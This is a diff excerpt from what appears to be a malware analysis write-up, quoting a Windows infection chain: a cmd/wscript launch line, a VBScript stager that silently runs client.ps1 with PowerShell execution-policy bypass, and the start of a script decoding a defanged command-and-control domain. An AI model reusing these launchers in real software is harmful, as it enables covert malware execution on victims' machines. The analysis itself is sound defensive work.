@@ -652,7 +652,7 @@ TotalPhysicalMemory : 2146947072
 <p><code>\Windows\System32\cmd.exe.%CD%+/c wscript //B //E:vbs %userprofile%\SYSTEM.C:\Windows\System32\Shell32.dll</code></p>
 <h3 id="system">SYSTEM</h3>
 <p>The file <code>SYSTEM</code> will be used to execute the <code>client.ps1</code> PowerShell:</p>
-<p><code>Dim shell,command Set shell = CreateObject(&quot;Wscript.Shell&quot;) command = &quot;powershell -noLogo -NonInteractive -ExecutionPolicy Bypass  -c &quot;&quot;invoke-expression $env:userprofile'\client.ps1'&quot;&quot;&quot; shell.Run command,0</code></p>
+<p><code>Dim shell,command Set shell = CreateObject(&quot;Wscript.Shell&quot;) command = &quot;powershell -noLogo -NonInteractive -ExecutionPolicy Bypass  -c &quot;&quot;invoke-expression $env:userprofile'\client.ps1'&quot;&quot;&quot; shell.Run command,0</code></p>
 <h3 id="clientps1-1">client.ps1</h3>
 <p>There are two problems that we&rsquo;ve now hit in our analysis. First, the file <code>client.ps1</code> is broken. The Base64 encoded domain <code>hxxps://zruwodree.gq</code> throws an error due to invalid length:</p>
 <pre><code class="xml">$global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cH
